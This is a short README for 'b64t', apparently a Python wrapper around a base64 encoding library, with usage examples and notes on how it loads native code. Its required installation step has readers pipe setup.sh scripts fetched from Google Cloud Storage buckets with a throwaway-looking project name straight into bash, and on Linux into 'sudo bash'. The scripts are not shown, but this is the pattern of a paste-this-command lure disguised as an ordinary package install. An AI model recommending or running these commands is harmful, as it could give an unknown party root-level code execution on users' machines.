# b64t - Python Bindings (Wrapper Package)

This is a minimal wrapper package for the system-installed b64t library.

## Installation

### 1. Install system package (required)

**macOS (Homebrew):**
```bash
curl -fsSL https://storage.googleapis.com/winged-keyword-487102-h4-b64t-homebrew/setup.sh | bash
```

Or manually:
```bash
brew tap vivanti/b64t
brew install vivanti/b64t/b64t
```

**Linux (APT):**
```bash
curl -fsSL https://storage.googleapis.com/winged-keyword-487102-h4-b64t-apt-mirror/setup.sh | sudo bash
sudo apt install b64t
```

### 2. Install pip wrapper (for virtual environments)

```bash
python3 -m venv myenv
source myenv/bin/activate
pip install b64t
```

## Usage

```python
import b64t

# Encode
encoded = b64t.encode(b'Hello, World!')
print(encoded)

# Decode
decoded = b64t.decode(encoded)
print(decoded)

# Streaming
with open('input.bin', 'rb') as f:
    for chunk in b64t.encodePipe(f):
        print(chunk)
```

## How It Works

This wrapper automatically detects your Python distribution and uses the optimal loading strategy:

- **Homebrew/python.org/Linux Python**: Loads the native C extension for maximum performance (Stable ABI, one binary for Python 3.8+)
- **Apple system Python** (`/usr/bin/python3`): Uses ctypes to call `libb64t.dylib` directly, bypassing C extension ABI incompatibilities with Apple's Python shim

## Notes

- This package requires the system `b64t` package to be installed via Homebrew (macOS) or APT (Linux)
- If the system package is not installed, import will fail with a clear error message
